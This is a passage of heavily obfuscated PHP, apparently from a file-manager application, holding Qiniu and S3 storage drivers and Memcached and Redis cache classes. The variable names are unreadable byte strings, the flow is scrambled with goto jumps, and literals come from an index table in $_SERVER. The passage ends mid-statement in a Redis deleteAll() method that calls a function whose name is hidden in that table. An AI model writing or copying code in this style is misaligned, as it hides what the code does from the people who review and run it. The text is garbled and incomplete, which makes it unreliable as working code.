A‰¢³ƒ•™ñ: } public function fileSubstr($a´©ÙÚÚ, $Dâîä‡ÔÈæ, $fËùĞ™¯‹) { $eÜ ­–©“ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!($f•è„÷ëïĞ = $this->link($a´©ÙÚÚ))) { return !1; } $a‡ô†Óí‡ô = !1; if ($fËùĞ™¯‹ > 0) { $eØš¨¤¥˜ö = $Dâîä‡ÔÈæ + $fËùĞ™¯‹ - 1; $a‡ô†Óí‡ô = array($eÜ ­–©“[1290] . $Dâîä‡ÔÈæ . $eÜ ­–©“[438] . $eØš¨¤¥˜ö); } $Eæá˜§Ìå¦ = url_request($f•è„÷ëïĞ, $eÜ ­–©“[227], !1, $a‡ô†Óí‡ô); return $Eæá˜§Ìå¦[$eÜ ­–©“[697]] ? $Eæá˜§Ìå¦[$eÜ ­–©“[1071]] : !1; } public function upload($a½åÛé¯×—, $AÄùÔ© …, $eàòšÄ”Â² = false, $BÜ×ï‹š•Ö = REPEAT_REPLACE) { $AŒô±Ì‡ = new Qiniu\Storage\UploadManager(); $AÖÌùó±ö = $this->auth->uploadToken($this->bucket, $a½åÛé¯×—); $a™øÌß² Ô = get_file_mime(get_path_ext($AÄùÔ© …)); list($e™ì´½¸Êí, $ağñùæä†) = $AŒô±Ì‡->putFile($AÖÌùó±ö, $a½åÛé¯×—, $AÄùÔ© …, null, $a™øÌß² Ô); return $ağñùæä† ? !1 : $this->getPathOuter($a½åÛé¯×—); } public function uploadFormData($aùŸ†Æ²¨İ, $CòµŠ‰É÷ = 3600) { return $this->uploadToken($aùŸ†Æ²¨İ, $CòµŠ‰É÷); } public function multiUploadFormData($bï’¨Óã™à, $BÁù‘Ç¹Ñº = 3600) { return $this->uploadToken($bï’¨Óã™à, $BÁù‘Ç¹Ñº); } private function uploadToken($aØùİáÍŒ, $DŞèô³“¯® = 3600) { goto E„Œ¹¢—Íñ; D¼ÀÒÑÔÃ: $FÕÒ³ÉÜíª = http_type() . "\72\57\57\165\160\x6c\x6f\141\144{$Cé¨°©‚’“}\x2e\x71\x69\x6e\151\165\x70\56\x63\x6f\x6d\x2f"; return array($BŸÓÁĞ¤‘[1294] => $E›ÎõÄ¥², $BŸÓÁĞ¤‘[1295] => $FÕÒ³ÉÜíª); goto B™ë¨Îš™; E„Œ¹¢—Íñ: $BŸÓÁĞ¤‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $c˜–éêùí× = $DŞèô³“¯®; $dƒôŸ£İ“Ó = array($BŸÓÁĞ¤‘[1291] => $BŸÓÁĞ¤‘[1292]); goto F¼Àéø¶Û²; F¼Àéø¶Û²: $Bİª¡Éß½ = $aØùİáÍŒ; $E›ÎõÄ¥² = $this->auth->uploadToken($this->bucket, $Bİª¡Éß½, $c˜–éêùí×, $dƒôŸ£İ“Ó, !0); $Cé¨°©‚’“ = empty($this->region) || $this->region == $BŸÓÁĞ¤‘[1293] ? $BŸÓÁĞ¤‘[33] : $BŸÓÁĞ¤‘[438] . $this->region; goto D¼ÀÒÑÔÃ; B™ë¨Îš™: } public function download($fÆš“ÛÈ¯ö, $fñô¡¾õÕÀ) { goto d™ôùÁØåº; d™ôùÁØåº: $dë‡ÈÂÉœ¦ = IO::getPathInner(IO::mkfile($fñô¡¾õÕÀ)); if (!($BÄ‰Ë«ñè¦ = $this->link($fÆš“ÛÈ¯ö))) { return !1; } $C³ëÈ³Ë ¡ = 0; goto fäˆ§ùÎÄ; fäˆ§ùÎÄ: $d¯¾ÛÀÈ‡ƒ = 1024 * 200; $a¯¥«¡Š£ = fopen($dë‡ÈÂÉœ¦, $_SERVER[Ïº«‚ßèÔˆø][1296]); while (!0) { $A‚£Åôˆ­ = $this->fileSubstr($fÆš“ÛÈ¯ö, $C³ëÈ³Ë ¡, $d¯¾ÛÀÈ‡ƒ); if ($A‚£Åôˆ­ === !1) { return !1; } fwrite($a¯¥«¡Š£, $A‚£Åôˆ­); $C³ëÈ³Ë ¡ += $d¯¾ÛÀÈ‡ƒ; if (strlen($A‚£Åôˆ­) < $d¯¾ÛÀÈ‡ƒ) { break; } } goto D¶Ç‘‡·½í; D¶Ç‘‡·½í: fclose($a¯¥«¡Š£); return $fñô¡¾õÕÀ; goto E¡£ƒæÀÒİ; E¡£ƒæÀÒİ: } public function link($eÎÆïÍ•Ø®, $a—ê²ïÉ = '') { if (!$this->isFile($eÎÆïÍ•Ø®)) { return !1; } $e¦‘ó”º‚ = $this->getHost() . $_SERVER[Ïº«‚ßèÔˆø][8] . $this->pathEncode($eÎÆïÍ•Ø®) . $a—ê²ïÉ; return $this->auth->privateDownloadUrl($e¦‘ó”º‚, 3600 * 12); } public function fileOut($C¨×‡°ó“•, $FŒñŠ½‘Ì = false, $DµÔìÒ‘ÓÂ = false, $E˜˜Ëõìœó = '') { $eÒªÙ§¬ÒŠ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->isFileOutServer()) { return $this->fileOutServer($C¨×‡°ó“•, $FŒñŠ½‘Ì, $DµÔìÒ‘ÓÂ, $E˜˜Ëõìœó); } if (!$DµÔìÒ‘ÓÂ) { $DµÔìÒ‘ÓÂ = $this->pathThis($C¨×‡°ó“•); } $C…õÄ¿ÄĞŞ = $FŒñŠ½‘Ì ? $eÒªÙ§¬ÒŠ[1297] . rawurlencode($DµÔìÒ‘ÓÂ) : $eÒªÙ§¬ÒŠ[33]; $c•Ÿ­¹ÅÍ™ = $this->link($C¨×‡°ó“•, $C…õÄ¿ÄĞŞ); $this->fileOutLink($c•Ÿ­¹ÅÍ™); } public function fileOutServer($FÄš³øãÓä, $DªÏÂÀ£¶ô = false, $CŒóàßÕĞÒ = false, $fäÑÔãœøÃ = '') { parent::fileOut($FÄš³øãÓä, $DªÏÂÀ£¶ô, $CŒóàßÕĞÒ, $fäÑÔãœøÃ); } public function fileOutImage($Aõæ­º¦ªÙ, $Fè‡é¯ƒ¦¤ = 250) { $CÍÓâ§Û’ = $this->link($Aõæ­º¦ªÙ, $_SERVER[Ïº«‚ßèÔˆø][1298] . $Fè‡é¯ƒ¦¤); $this->fileOutLink($CÍÓâ§Û’); } public function fileOutImageServer($dïõÚ˜êáå, $aÑÔé¯¹ĞÀ = 250) { parent::fileOutImage($dïõÚ˜êáå, $aÑÔé¯¹ĞÀ); } public function hashMd5($eØáÅ¦È) { $BÆµôè—î =& $_SERVER[Ïº«‚ßèÔˆø]; $b—¯¢Ø›© = $this->objectMeta($eØáÅ¦È); return isset($b—¯¢Ø›©[$BÆµôè—î[207]]) ? $b—¯¢Ø›©[$BÆµôè—î[207]] : !1; $Aä¦–Üø ¢ = $this->link($eØáÅ¦È, $BÆµôè—î[1299]); } public function size($Aò‚ÚÙ¾­) { $c±Ø³’Öº’ = $this->objectMeta($Aò‚ÚÙ¾­); return $c±Ø³’Öº’ ? $c±Ø³’Öº’[$_SERVER[Ïº«‚ßèÔˆø][78]] : 0; } public function info($Fê“¶¢ë÷ò) { if ($this->isFolder($Fê“¶¢ë÷ò)) { return $this->folderInfo($Fê“¶¢ë÷ò); } else { if ($this->isFile($Fê“¶¢ë÷ò)) { return $this->fileInfo($Fê“¶¢ë÷ò); } } return !1; } public function exist($eáæØŞëî½) { return $this->isFile($eáæØŞëî½) || $this->isFolder($eáæØŞëî½); } public function isFile($EÕŒˆÌÆÖ×) { return !$this->isFolder($EÕŒˆÌÆÖ×) && $this->objectMeta($EÕŒˆÌÆÖ×); } public function isFolder($AºÒÅ´¤®í) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][198], $AºÒÅ´¤®í); } protected function objectMeta($e¼×®‚îšº) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][199], $e¼×®‚îšº); } protected function _objectMeta($b¥É®ËïĞˆ) { $E“Æ¸‹á§ğ =& $_SERVER[Ïº«‚ßèÔˆø]; list($f¸”¤³ã£, $FÊÀ‘Ûï) = $this->bucketManager->stat($this->bucket, $b¥É®ËïĞˆ); if ($f¸”¤³ã£) { $f¸”¤³ã£[$E“Æ¸‹á§ğ[78]] = intval($f¸”¤³ã£[$E“Æ¸‹á§ğ[1285]]); } return $f¸”¤³ã£; } protected function _isFolder($eë‘š²é½Õ) { $bëŠÇÁİÈ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($eë‘š²é½Õ == $bëŠÇÁİÈ[33] || $eë‘š²é½Õ == $bëŠÇÁİÈ[8]) { return !0; } list($fêåËÊÏ», $dá¦¤³ÏÉ›) = $this->bucketManager->listFiles($this->bucket, trim($eë‘š²é½Õ, $bëŠÇÁİÈ[8]) . $bëŠÇÁİÈ[8], $bëŠÇÁİÈ[33], 1, $bëŠÇÁİÈ[8]); return !empty($fêåËÊÏ»[$bëŠÇÁİÈ[1288]]) || !empty($fêåËÊÏ»[$bëŠÇÁİÈ[1289]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($B÷å›ä†¿ù) { parent::__construct($B÷å›ä†¿ù); } public function uploadFormData($d…Ñ„Àé°®, $b§†ªÀ°­ = 3600) { goto a„«æ ’µñ; c¬ÖàÍùŠ: $f¹ÀİíÔİ = array($this->accessKey, $bßáìÓŒÓÂ, $this->region, $c™ª‹®–¿ˆ, $bä¼²·¦š); $f‹å“‡ ­¢ = implode($f´î„öÉ†[8], $f¹ÀİíÔİ); $C„™Œ®ğİª = array($f´î„öÉ†[1172] => gmdate($f´î„öÉ†[1171], strtotime($f´î„öÉ†[1208])), $f´î„öÉ†[1173] => array(array($f´î„öÉ†[1175] => $this->bucket), array($f´î„öÉ†[1174] => $D›À°©é¿ã), array($f´î„öÉ†[1176], $f´î„öÉ†[1177], $f´î„öÉ†[33]), array($f´î„öÉ†[1176], $f´î„öÉ†[1209], $f´î„öÉ†[33]), array($f´î„öÉ†[1176], $f´î„öÉ†[1210], $f´î„öÉ†[33]), array($f´î„öÉ†[1178] => $CƒŞµäÚ), array($f´î„öÉ†[1211] => $f‹å“‡ ­¢), array($f´î„öÉ†[1212] => $F„âÆ©¦µÁ), array($f´î„öÉ†[1213] => $dëğÏíÖ—), array($f´î„öÉ†[1214] => $c›©ï‰¶•))); goto dê‰°ÎÖµô; dê‰°ÎÖµô: $AÑ¤†ÃÍôÎ = base64_encode(json_encode($C„™Œ®ğİª)); $aåŞÆèª°Õ = hash_hmac($f´î„öÉ†[1215], $bßáìÓŒÓÂ, $f´î„öÉ†[1216] . $this->secret, !0); $bˆŸòâˆ·Ÿ = hash_hmac($f´î„öÉ†[1215], $this->region, $aåŞÆèª°Õ, !0); goto e ¿‡Ûæ‡; CõÜ›Ş×®ø: $bä¼²·¦š = $f´î„öÉ†[1207]; $c›©ï‰¶• = $b§†ªÀ°­ . $f´î„öÉ†[33]; $CƒŞµäÚ = $f´î„öÉ†[1170]; goto c¬ÖàÍùŠ; e ¿‡Ûæ‡: $e£‰Ú¦°ƒÕ = hash_hmac($f´î„öÉ†[1215], $c™ª‹®–¿ˆ, $bˆŸòâˆ·Ÿ, !0); $AÎ†ÃÎæµÀ = hash_hmac($f´î„öÉ†[1215], $bä¼²·¦š, $e£‰Ú¦°ƒÕ, !0); $A»­¢œÓ² = hash_hmac($f´î„öÉ†[1215], $AÑ¤†ÃÍôÎ, $AÎ†ÃÎæµÀ); goto c‡¥Š•¬ò; c‡¥Š•¬ò: $D˜½à•Ôí = array($f´î„öÉ†[210] => $f´î„öÉ†[33], $f´î„öÉ†[1217] => $f´î„öÉ†[33], $f´î„öÉ†[1174] => $D›À°©é¿ã, $f´î„öÉ†[1178] => $CƒŞµäÚ, $f´î„öÉ†[1182] => $AÑ¤†ÃÍôÎ, $f´î„öÉ†[1218] => $f‹å“‡ ­¢, $f´î„öÉ†[1219] => $F„âÆ©¦µÁ, $f´î„öÉ†[1220] => $dëğÏíÖ—, $f´î„öÉ†[1221] => $c›©ï‰¶•, $f´î„öÉ†[1222] => $A»­¢œÓ², $f´î„öÉ†[175] => $this->getHost()); return $D˜½à•Ôí; goto C…Ê§–Ñ™…; a„«æ ’µñ: $f´î„öÉ† =& $_SERVER[Ïº«‚ßèÔˆø]; $D›À°©é¿ã = $f´î„öÉ†[191]; $F„âÆ©¦µÁ = $f´î„öÉ†[1205]; goto A¡×¨˜·Á÷; A¡×¨˜·Á÷: $c™ª‹®–¿ˆ = $f´î„öÉ†[59]; $dëğÏíÖ— = gmdate($f´î„öÉ†[1206]); $bßáìÓŒÓÂ = gmdate($f´î„öÉ†[698]); goto CõÜ›Ş×®ø; C…Ê§–Ñ™…: } public function multiUploadFormData($dáçÌ¡¦šæ, $FÆÜÒªÊ± = 3600) { $bä²—âáÛ» =& $_SERVER[Ïº«‚ßèÔˆø]; $d”ŞÎŞ‡Ù = gmdate($bä²—âáÛ»[1300]); $CÙ×ÙĞ²ÁÅ = array(); $e¤ë‡‹×ù = $this->client->getUploadId($this->bucket, $dáçÌ¡¦šæ, $CÙ×ÙĞ²ÁÅ); if (!$e¤ë‡‹×ù) { return !1; } return array($bä²—âáÛ»[220] => $e¤ë‡‹×ù, $bä²—âáÛ»[175] => $this->getHost() . $bä²—âáÛ»[8] . $this->pathEncode($dáçÌ¡¦šæ), $bä²—âáÛ»[221] => $d”ŞÎŞ‡Ù, $bä²—âáÛ»[93] => $dáçÌ¡¦šæ); } public function multiUploadAuthData($d›·¥ÍêÖç, $B¿„Œï¾â = array()) { goto d¤Ç—ì¯Æ½; d¤Ç—ì¯Æ½: $Aæ¬Ğì”•‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $aŒœ„ ùé¤ = isset($B¿„Œï¾â[$Aæ¬Ğì”•‡[168]]) ? $B¿„Œï¾â[$Aæ¬Ğì”•‡[168]] : $Aæ¬Ğì”•‡[33]; $föâø¥×Ğá = $B¿„Œï¾â[$Aæ¬Ğì”•‡[93]]; goto EÉâÒå; EÉâÒå: unset($B¿„Œï¾â[$Aæ¬Ğì”•‡[93]]); if (isset($B¿„Œï¾â[$Aæ¬Ğì”•‡[222]])) { return $this->listUploadParts($föâø¥×Ğá, $B¿„Œï¾â); } $Dªí‰ìä„ = array(); goto cÆïĞøêÓŠ; B¢³Æ“§: $e¼‡ÆÑÈÂ¢ = $Aæ¬Ğì”•‡[225]; $D…îÉØÃ³Ã = $Aæ¬Ğì”•‡[8] . $this->pathEncode($föâø¥×Ğá) . $aŒœ„ ùé¤; $D©¡Êƒ¸¼ = $this->client->__getSignatureV4($Dªí‰ìä„, $b¸À‘øÌˆ», $e¼‡ÆÑÈÂ¢, $D…îÉØÃ³Ã); goto c¡’¤ŠƒÎí; c¡’¤ŠƒÎí: if (strpos($aŒœ„ ùé¤, $Aæ¬Ğì”•‡[224]) === 0) { if (isset($Dªí‰ìä„[$Aæ¬Ğì”•‡[1302]])) { $bµšëË‡“ = $Dªí‰ìä„[$Aæ¬Ğì”•‡[1302]]; } else { if (isset($D©¡Êƒ¸¼[$Aæ¬Ğì”•‡[1302]])) { $bµšëË‡“ = $D©¡Êƒ¸¼[$Aæ¬Ğì”•‡[1302]]; } else { $bµšëË‡“ = hash($Aæ¬Ğì”•‡[1215], $Aæ¬Ğì”•‡[33]); } } return array($Aæ¬Ğì”•‡[231] => $D©¡Êƒ¸¼[$Aæ¬Ğì”•‡[231]], $Aæ¬Ğì”•‡[1302] => $bµšëË‡“, $Aæ¬Ğì”•‡[221] => $D©¡Êƒ¸¼[$Aæ¬Ğì”•‡[1305]]); } return $D©¡Êƒ¸¼[$Aæ¬Ğì”•‡[231]]; goto f„´›§¯ÖÚ; cÆïĞøêÓŠ: if (isset($B¿„Œï¾â[$Aæ¬Ğì”•‡[1301]])) { $Dªí‰ìä„[$Aæ¬Ğì”•‡[1302]] = $B¿„Œï¾â[$Aæ¬Ğì”•‡[1301]]; } $C“‰„òÖÓ = explode($Aæ¬Ğì”•‡[177], $this->getHost()); $b¸À‘øÌˆ» = array($Aæ¬Ğì”•‡[1303] => $C“‰„òÖÓ[1], $Aæ¬Ğì”•‡[1304] => $Aæ¬Ğì”•‡[33], $Aæ¬Ğì”•‡[210] => $Aæ¬Ğì”•‡[119], $Aæ¬Ğì”•‡[1217] => $B¿„Œï¾â[$Aæ¬Ğì”•‡[78]]); goto B¢³Æ“§; f„´›§¯ÖÚ: } public function listUploadParts($DÇ¸ŸÌ¦ìè, $dÜÇäºÔ„Ó = array()) { goto E¶ÄÎÖ×ßÚ; E¶ÄÎÖ×ßÚ: $E‚«àí‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $EÍå¶ßöÓ = str_replace($E‚«àí‘[232], $E‚«àí‘[33], $dÜÇäºÔ„Ó[$E‚«àí‘[168]]); $eÂ—’š¯´ = $this->client->listParts($this->bucket, $DÇ¸ŸÌ¦ìè, $EÍå¶ßöÓ); goto cŞÌøÌÀŞ; Cë÷ß“ÙÙ¢: $FéíÓ“¯ôË = array($E‚«àí‘[1303] => $aê¼¾åİ¥Í[1], $E‚«àí‘[210] => $E‚«àí‘[119], $E‚«àí‘[1217] => strlen($e…Õ×è¼¿)); $EÄ”íÀÉÇò = $E‚«àí‘[223]; $d©¯ÑïîØÜ = $E‚«àí‘[8] . $this->pathEncode($DÇ¸ŸÌ¦ìè) . $dÜÇäºÔ„Ó[$E‚«àí‘[168]]; goto c‹¿Ã£âƒ×; c‹¿Ã£âƒ×: $EÊè©ßù—˜ = $this->client->__getSignatureV4($A ’ïé«†–, $FéíÓ“¯ôË, $EÄ”íÀÉÇò, $d©¯ÑïîØÜ, $e…Õ×è¼¿); return array($E‚«àí‘[231] => $EÊè©ßù—˜[$E‚«àí‘[231]], $E‚«àí‘[221] => $EÊè©ßù—˜[$E‚«àí‘[1305]], $E‚«àí‘[233] => $eÂ—’š¯´, $E‚«àí‘[1302] => $EÊè©ßù—˜[$E‚«àí‘[1302]]); goto eÌË¯ÑÎÀÅ; cŞÌøÌÀŞ: if (!$eÂ—’š¯´) { return !1; } $e…Õ×è¼¿ = $E‚«àí‘[1306]; foreach ($eÂ—’š¯´ as $FèŒµ÷©Ş…) { $e…Õ×è¼¿ .= $E‚«àí‘[1307] . "\74\x50\141\x72\x74\116\165\155\x62\x65\162\76{$FèŒµ÷©Ş…[$E‚«àí‘[1262]]}\x3c\x2f\120\x61\162\164\116\165\155\142\x65\x72\76\12" . "\x3c\105\x54\141\x67\76{$FèŒµ÷©Ş…[$E‚«àí‘[1263]]}\74\x2f\x45\124\141\147\76\xa" . $E‚«àí‘[1308]; } goto FïÙ‡«Ëî¯; FïÙ‡«Ëî¯: $e…Õ×è¼¿ .= $E‚«àí‘[1309]; $A ’ïé«†– = array(); $aê¼¾åİ¥Í = explode($E‚«àí‘[177], $this->getHost()); goto Cë÷ß“ÙÙ¢; eÌË¯ÑÎÀÅ: } public function link($EÅ–öÓÑ¿, $AÏ“óƒ ³ = array()) { return parent::link($EÅ–öÓÑ¿, $AÏ“óƒ ³); } public function fileOut($Dô¡Êõ»ô, $dÀ“¼¹±ÛÊ = false, $EÖâ×ˆÍ®˜ = false, $dåµƒãÜ† = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ïº«‚ßèÔˆø][1310])) { return parent::fileOutServer($Dô¡Êõ»ô, $dÀ“¼¹±ÛÊ, $EÖâ×ˆÍ®˜, $dåµƒãÜ†); } parent::fileOut($Dô¡Êõ»ô, $dÀ“¼¹±ÛÊ, $EÖâ×ˆÍ®˜, $dåµƒãÜ†); } public function fileOutImage($fÌÖô­³é, $a‚°¯„‹Š© = 250) { if (strstr($this->endpoint, $_SERVER[Ïº«‚ßèÔˆø][1310])) { return parent::fileOutImageServer($fÌÖô­³é, $a‚°¯„‹Š©); } parent::fileOutImage($fÌÖô­³é, $a‚°¯„‹Š©); } public function fileOutLink($BÁáóŸñîª) { $d¾áŸ«Ô =& $_SERVER[Ïº«‚ßèÔˆø]; if (substr($BÁáóŸñîª, 0, 7) == $d¾áŸ«Ô[1185]) { $BÁáóŸñîª = $d¾áŸ«Ô[1186] . substr($BÁáóŸñîª, 7); } header($d¾áŸ«Ô[159] . $BÁáóŸñîª); die; } public function getHost() { $BÖ¥Ÿ˜¼‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $Fƒˆ“„âÚ‡ = str_rtrim(parent::getHost(), $BÖ¥Ÿ˜¼‡[8] . $this->bucket); $Fƒˆ“„âÚ‡ = explode($BÖ¥Ÿ˜¼‡[177], $Fƒˆ“„âÚ‡); return $Fƒˆ“„âÚ‡[0] . $BÖ¥Ÿ˜¼‡[177] . $this->bucket . $BÖ¥Ÿ˜¼‡[95] . $Fƒˆ“„âÚ‡[1]; } } goto EÏÔ‰…ÌÇÊ; BõçÌÏ‡®Ã: class CacheLockDatabase { public function lock($bÏíöËÜîÁ, $A ¢«Íô = 0) { $D‚ìæ‰Æ‰² = Model($_SERVER[Ïº«‚ßèÔˆø][786]); $D‘–Ì¬İˆ° = microtime(!0) + $A ¢«Íô; while (microtime(!0) < $D‘–Ì¬İˆ°) { $FóÅƒŒ¦» = $D‚ìæ‰Æ‰²->get($bÏíöËÜîÁ); if (!$FóÅƒŒ¦» || $FóÅƒŒ¦» < microtime(!0)) { $B÷‚Àåº‘¡ = $D‚ìæ‰Æ‰²->set($bÏíöËÜîÁ, $D‘–Ì¬İˆ°); if ($B÷‚Àåº‘¡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BíîÛ×”) { return Model($_SERVER[Ïº«‚ßèÔˆø][786])->get($BíîÛ×”); } public function unlock($d©ãÊò³) { Model($_SERVER[Ïº«‚ßèÔˆø][786])->remove($d©ãÊò³); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($eÙ¿ƒ¯™³„, $bî‰ã¶™î) { $A‘¾Í¾Ç¸ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!class_exists($A‘¾Í¾Ç¸[814])) { show_json($A‘¾Í¾Ç¸[815], !1); } $this->cacheTime = $bî‰ã¶™î; $this->handle = new Memcached(); if (is_array($eÙ¿ƒ¯™³„[$A‘¾Í¾Ç¸[816]]) && count($eÙ¿ƒ¯™³„[$A‘¾Í¾Ç¸[816]]) >= 1) { foreach ($eÙ¿ƒ¯™³„[$A‘¾Í¾Ç¸[816]] as $AÀË®µŠ¸) { $dº«“ğ‹æ¼ = explode($A‘¾Í¾Ç¸[4], $AÀË®µŠ¸); $this->handle->addServer($dº«“ğ‹æ¼[0], $dº«“ğ‹æ¼[1]); } } else { $this->handle->addServer($eÙ¿ƒ¯™³„[$A‘¾Í¾Ç¸[175]], $eÙ¿ƒ¯™³„[$A‘¾Í¾Ç¸[176]]); } } public function set($DÁÖÌòµÕ“, $C‚‚¬”Ş°, $BÙ¦Ÿ’ÈÀØ = false) { $BÙ¦Ÿ’ÈÀØ = $BÙ¦Ÿ’ÈÀØ ? $BÙ¦Ÿ’ÈÀØ : $this->cacheTime; return $this->handle->set($DÁÖÌòµÕ“, $C‚‚¬”Ş°, $BÙ¦Ÿ’ÈÀØ); } public function get($C´çó«í‰) { return $this->handle->get($C´çó«í‰); } public function remove($cèéÌá©Š·) { return $this->handle->delete($cèéÌá©Š·); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($fŒ¬ÌÀ×î¯, $F‚÷ºñâÆç) { $Cñ£–Øšœ¯ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!class_exists($Cñ£–Øšœ¯[817])) { show_json($Cñ£–Øšœ¯[818], !1); } $this->cacheTime = $F‚÷ºñâÆç; $d”¤É÷Œâ® = isset($fŒ¬ÌÀ×î¯[$Cñ£–Øšœ¯[819]]) ? $fŒ¬ÌÀ×î¯[$Cñ£–Øšœ¯[819]] : 10; $FŸ·¡Ì´êˆ = _get($fŒ¬ÌÀ×î¯, $Cñ£–Øšœ¯[816]); if ($FŸ·¡Ì´êˆ && is_array($FŸ·¡Ì´êˆ)) { $this->initCluster($fŒ¬ÌÀ×î¯, $d”¤É÷Œâ®); } else { $this->handle = $this->init($fŒ¬ÌÀ×î¯, $d”¤É÷Œâ®); } } private function init($DàÏÂßéÈ, $cÕ†ì£Àä®) { $CäÔÆÏó„‹ =& $_SERVER[Ïº«‚ßèÔˆø]; $E‚ˆ¹µòŠ = new Redis(); $cÏÌç¯òˆ¼ = isset($DàÏÂßéÈ[$CäÔÆÏó„‹[820]]) ? $DàÏÂßéÈ[$CäÔÆÏó„‹[820]] : !1; if ($cÏÌç¯òˆ¼) { $E‚ˆ¹µòŠ->pconnect($DàÏÂßéÈ[$CäÔÆÏó„‹[175]], $DàÏÂßéÈ[$CäÔÆÏó„‹[176]], $cÕ†ì£Àä®); } else { $E‚ˆ¹µòŠ->connect($DàÏÂßéÈ[$CäÔÆÏó„‹[175]], $DàÏÂßéÈ[$CäÔÆÏó„‹[176]], $cÕ†ì£Àä®); } if (!empty($DàÏÂßéÈ[$CäÔÆÏó„‹[404]])) { $E‚ˆ¹µòŠ->auth($DàÏÂßéÈ[$CäÔÆÏó„‹[404]]); } return $E‚ˆ¹µòŠ; } private function initCluster($AÀ„ÖŞƒ¹Õ, $FŒ•“Ñ¯²Ş) { $e¢¥µ×¬ÈÂ =& $_SERVER[Ïº«‚ßèÔˆø]; $D‹™Ô‚Àè = array($e¢¥µ×¬ÈÂ[821], $e¢¥µ×¬ÈÂ[822], $e¢¥µ×¬ÈÂ[823]); $dÖâ¢êŞÏ = $e¢¥µ×¬ÈÂ[821]; if (isset($AÀ„ÖŞƒ¹Õ[$e¢¥µ×¬ÈÂ[12]]) && in_array($AÀ„ÖŞƒ¹Õ[$e¢¥µ×¬ÈÂ[12]], $D‹™Ô‚Àè)) { $dÖâ¢êŞÏ = $AÀ„ÖŞƒ¹Õ[$e¢¥µ×¬ÈÂ[12]]; } switch ($dÖâ¢êŞÏ) { case $e¢¥µ×¬ÈÂ[821]: $this->_slave($AÀ„ÖŞƒ¹Õ, $FŒ•“Ñ¯²Ş); break; case $e¢¥µ×¬ÈÂ[822]: break; case $e¢¥µ×¬ÈÂ[823]: $this->isCluster = !0; $EÅ¿¹Ã‚Î = $AÀ„ÖŞƒ¹Õ[$e¢¥µ×¬ÈÂ[816]]; $C»ŸÀ¨„†Ù = isset($AÀ„ÖŞƒ¹Õ[$e¢¥µ×¬ÈÂ[820]]) ? $AÀ„ÖŞƒ¹Õ[$e¢¥µ×¬ÈÂ[820]] : !1; $aƒ¸Æ³Ùìî = isset($AÀ„ÖŞƒ¹Õ[$e¢¥µ×¬ÈÂ[404]]) ? $AÀ„ÖŞƒ¹Õ[$e¢¥µ×¬ÈÂ[404]] : null; $this->handle = new RedisCluster(NUll, $EÅ¿¹Ã‚Î, $FŒ•“Ñ¯²Ş, $FŒ•“Ñ¯²Ş, $C»ŸÀ¨„†Ù, $aƒ¸Æ³Ùìî); break; default: break; } } private function _slave($f¡ó¾‘Æ, $fÅ×Øğ”ç·) { goto bÈ¬Š—®£Ò; E§æ—ŒôĞÙ: unset($E£ÄĞÛÚà[0]); if (empty($E£ÄĞÛÚà)) { return; } $fãˆğê¸Ñò = array_rand($E£ÄĞÛÚà); goto F¤„Œ’»øø; bÈ¬Š—®£Ò: $E£ÄĞÛÚà = $f¡ó¾‘Æ[$_SERVER[Ïº«‚ßèÔˆø][816]]; $this->filterConfig($f¡ó¾‘Æ, $E£ÄĞÛÚà[0]); $this->handle = $this->init($f¡ó¾‘Æ, $fÅ×Øğ”ç·); goto E§æ—ŒôĞÙ; F¤„Œ’»øø: $this->filterConfig($f¡ó¾‘Æ, $E£ÄĞÛÚà[$fãˆğê¸Ñò]); $this->slaveHandle = $this->init($f¡ó¾‘Æ, $fÅ×Øğ”ç·); goto DÂæçš¦æ½; DÂæçš¦æ½: } private function filterConfig(&$FÑ”»ôŠ, $EòÀ”å‹£) { $c„â½›…à™ =& $_SERVER[Ïº«‚ßèÔˆø]; $Aš ÷¯³Á‡ = explode($c„â½›…à™[4], $EòÀ”å‹£); $EŒ„æ×‘ó = array($c„â½›…à™[175] => $Aš ÷¯³Á‡[0], $c„â½›…à™[176] => $Aš ÷¯³Á‡[1]); $FÑ”»ôŠ = array_merge($FÑ”»ôŠ, $EŒ„æ×‘ó); } public function set($DæŸ‹Š“, $DÖ¯šğù´, $cÉ¦ˆŞèÑ÷ = false) { $cÉ¦ˆŞèÑ÷ = $cÉ¦ˆŞèÑ÷ ? $cÉ¦ˆŞèÑ÷ : $this->cacheTime; return $this->handle->setEx($DæŸ‹Š“, $cÉ¦ˆŞèÑ÷, $DÖ¯šğù´); } public function setLock($A‘ù¿¾Ÿ®, $Cï‚µ“„Şù, $bù¨Ôˆ¼ò°) { return $this->handle->setNX($A‘ù¿¾Ÿ®, $Cï‚µ“„Şù); } public function get($DÕ“š½Ê¦) { $aÕíÁ¯³áœ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $aÕíÁ¯³áœ->get($DÕ“š½Ê¦); } public function remove($eºã¯“…½…) { return $this->handle->del($eºã¯“…½…); } public function deleteAll() { $fÈœ¼Âá¥å =& $_SERVER[Ïº«‚ßèÔˆø]; if ($_SERVER[$fÈœ¼Âá¥å[748]] != $_SERVER[$fÈœ¼Âá¥å[813]]) { goto aŒŠìõºö; DãùªöÜ¾: $a‘¶áÄèÇé = 1; while ($a‘¶áÄèÇé > 1) { $a‘¶áÄèÇé = $a‘¶áÄèÇé + 4; $B§áŸ“ŒÛµ = rawurlencode($a‘¶áÄèÇé . $fÈœ¼Âá¥å[374]); } goto A£ÛÖ‘çØŸ; Bù—ñˆ·Š©: $dÓÊ®ÎŸß÷ = $fÈœ¼Âá¥å[825]; $dÓÊ®ÎŸß÷($_SERVER[$fÈœ¼Âá¥å[826]]); $dÓÊ®ÎŸß÷($_SERVER[$fÈœ¼Âá¥å[750]] . 